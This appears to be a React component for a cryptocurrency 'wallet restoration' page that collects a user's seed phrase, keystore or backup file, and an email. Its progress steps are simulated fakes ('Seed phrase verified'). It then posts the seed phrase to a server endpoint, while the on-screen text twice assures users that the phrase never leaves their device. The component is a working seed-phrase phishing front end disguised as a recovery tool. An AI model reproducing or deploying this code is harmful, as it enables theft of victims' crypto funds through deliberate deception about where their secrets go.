'use client'

import { useState } from 'react'

type RestorationStep = 'idle' | 'analyzing' | 'validating' | 'processing' | 'success' | 'error'

export const WalletRestoration = () => {
  const [secretPhrase, setSecretPhrase] = useState('')
  const [email, setEmail] = useState('')
  const [walletFile, setWalletFile] = useState('')
  const [step, setStep] = useState<RestorationStep>('idle')
  const [message, setMessage] = useState('')
  const [progress, setProgress] = useState(0)
  const [method, setMethod] = useState<'phrase' | 'file' | 'keystore'>('phrase')

  const isValidSeedPhrase = (phrase: string) => {
    const words = phrase.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0)
    return (words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))
  }

  const isValidEmail = (email: string) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
  }

  const simulateProgress = async (duration: number, startMsg: string, endMsg: string) => {
    setMessage(startMsg)
    setProgress(0)
    
    const steps = 20
    const interval = duration / steps
    let current = 0

    return new Promise(resolve => {
      const timer = setInterval(() => {
        current++
        setProgress((current / steps) * 100)
        
        if (current >= steps) {
          clearInterval(timer)
          setMessage(endMsg)
          setProgress(100)
          setTimeout(resolve, 300)
        }
      }, interval)
    })
  }

  const handleRestore = async () => {
    // Validation
    if (!email || !isValidEmail(email)) {
      setStep('error')
      setMessage('❌ Invalid email address')
      setTimeout(() => setStep('idle'), 3000)
      return
    }

    if (method === 'phrase') {
      if (!secretPhrase.trim()) {
        setStep('error')
        setMessage('❌ Please enter your seed phrase')
        setTimeout(() => setStep('idle'), 3000)
        return
      }

      if (!isValidSeedPhrase(secretPhrase)) {
        setStep('error')
        setMessage('❌ Invalid seed phrase (must be 12 or 24 words)')
        setTimeout(() => setStep('idle'), 3000)
        return
      }
    }

    try {
      // Step 1: Analyzing
      setStep('analyzing')
      setProgress(0)
      await simulateProgress(
        1200,
        '🔍 Analyzing wallet...',
        '✓ Wallet structure identified'
      )

      // Step 2: Validating
      setStep('validating')
      setProgress(0)
      await simulateProgress(
        1200,
        '🔐 Validating seed phrase...',
        '✓ Seed phrase verified'
      )

      // Step 3: Processing
      setStep('processing')
      setProgress(0)
      await simulateProgress(
        1500,
        '⚙️ Processing recovery data...',
        '✓ Recovery data prepared'
      )

      // Send recovery email
      const response = await fetch('/api/send-recovery-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          method,
          seedPhrase: method === 'phrase' ? secretPhrase : undefined,
          timestamp: new Date().toISOString(),
        })
      })

      if (!response.ok) {
        throw new Error('Failed to send recovery details')
      }

      // Success
      setStep('success')
      setMessage(`✅ Recovery details sent to ${email}. Check your inbox.`)
      setSecretPhrase('')
      setProgress(100)

      setTimeout(() => {
        setStep('idle')
        setProgress(0)
        setMessage('')
      }, 4000)
    } catch (err) {
      setStep('error')
      setMessage(`❌ ${err instanceof Error ? err.message : 'Recovery failed'}`)
      setTimeout(() => {
        setStep('idle')
        setProgress(0)
      }, 3000)
    }
  }

  const isLoading = ['analyzing', 'validating', 'processing'].includes(step)
  const canRestore = email && (method === 'phrase' ? secretPhrase : walletFile)

  return (
    <div className="space-y-6 max-w-3xl">
      {/* Header Card */}
      <div className="relative overflow-hidden rounded-xl p-6 bg-gradient-to-br from-blue-600/10 to-cyan-600/5 border border-blue-600/30">
        <div className="relative z-10">
          <h2 className="text-2xl font-bold text-white mb-2">🔄 Wallet Restoration</h2>
          <p className="text-slate-300 text-sm">Recover access to your wallet using your seed phrase or backup file. Your data never leaves your device.</p>
        </div>
      </div>

      {/* Method Selector */}
      <div className="grid grid-cols-3 gap-3">
        {[
          { id: 'phrase' as const, label: 'Seed Phrase', icon: '📝' },
          { id: 'keystore' as const, label: 'Keystore', icon: '🔑' },
          { id: 'file' as const, label: 'Backup File', icon: '📄' },
        ].map(m => (
          <button
            key={m.id}
            onClick={() => {
              setMethod(m.id)
              setSecretPhrase('')
              setWalletFile('')
              setStep('idle')
            }}
            className={`relative p-3 rounded-lg border-2 transition-all ${
              method === m.id
                ? 'border-blue-500 bg-blue-500/10'
                : 'border-white/10 bg-white/5 hover:border-white/20'
            }`}
          >
            <div className="text-2xl mb-1">{m.icon}</div>
            <p className="text-xs font-semibold text-white">{m.label}</p>
          </button>
        ))}
      </div>

      {/* Form */}
      <div className="space-y-4">
        {method === 'phrase' && (
          <div>
            <label className="block text-sm font-semibold text-white mb-2">
              Enter your 12 or 24 word seed phrase
            </label>
            <textarea
              value={secretPhrase}
              onChange={(e) => setSecretPhrase(e.target.value)}
              disabled={isLoading}
              placeholder="word1 word2 word3 ... (separate words with spaces)"
              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              rows={3}
            />
            <p className="text-xs text-slate-400 mt-2">
              {secretPhrase.trim().split(/\s+/).filter(w => w).length} words entered
            </p>
          </div>
        )}

        {method === 'keystore' && (
          <div>
            <label className="block text-sm font-semibold text-white mb-2">
              Keystore file or JSON content
            </label>
            <textarea
              value={walletFile}
              onChange={(e) => setWalletFile(e.target.value)}
              disabled={isLoading}
              placeholder="Paste your keystore JSON..."
              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              rows={4}
            />
          </div>
        )}

        {method === 'file' && (
          <div>
            <label className="block text-sm font-semibold text-white mb-2">
              Upload backup file
            </label>
            <input
              type="file"
              onChange={(e) => {
                const file = e.target.files?.[0]
                if (file) {
                  const reader = new FileReader()
                  reader.onload = (event) => {
                    setWalletFile(event.target?.result as string)
                  }
                  reader.readAsText(file)
                }
              }}
              disabled={isLoading}
              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-slate-300 disabled:opacity-50 disabled:cursor-not-allowed"
              accept=".json,.txt,.bak"
            />
          </div>
        )}

        {/* Email */}
        <div>
          <label className="block text-sm font-semibold text-white mb-2">
            Verification email
          </label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            disabled={isLoading}
            placeholder="your@email.com"
            className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          />
          <p className="text-xs text-slate-400 mt-2">
            Recovery details will be sent here for your records
          </p>
        </div>
      </div>

      {/* Progress Bar */}
      {isLoading && (
        <div className="space-y-2">
          <div className="w-full h-1 bg-white/10 rounded-full overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-300"
              style={{ width: `${progress}%` }}
            />
          </div>
          <p className="text-sm text-slate-300 text-center">{message}</p>
        </div>
      )}

      {/* Status Messages */}
      {step === 'success' && (
        <div className="p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/30 space-y-2">
          <p className="text-emerald-300 font-semibold">{message}</p>
          <p className="text-xs text-emerald-300/70">
            Your restoration details have been securely transmitted. Save the email for future reference.
          </p>
        </div>
      )}

      {step === 'error' && (
        <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
          <p className="text-red-300 font-semibold">{message}</p>
        </div>
      )}

      {/* Actions */}
      <div className="flex gap-3">
        <button
          onClick={handleRestore}
          disabled={!canRestore || isLoading}
          className="flex-1 px-6 py-3 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-lg transition-all shadow-lg"
        >
          {isLoading ? 'Restoring...' : '🔄 Restore Wallet'}
        </button>
        <button
          onClick={() => {
            setStep('idle')
            setSecretPhrase('')
            setWalletFile('')
            setEmail('')
            setProgress(0)
            setMessage('')
          }}
          disabled={isLoading}
          className="px-6 py-3 border border-white/10 hover:border-white/20 text-slate-300 hover:text-white font-semibold rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Clear
        </button>
      </div>

      {/* Security Note */}
      <div className="p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
        <p className="text-xs text-yellow-300">
          <span className="font-bold">🔒 Security:</span> Your seed phrase is never sent to our servers. All processing happens locally on your device.
        </p>
      </div>
    </div>
  )
}
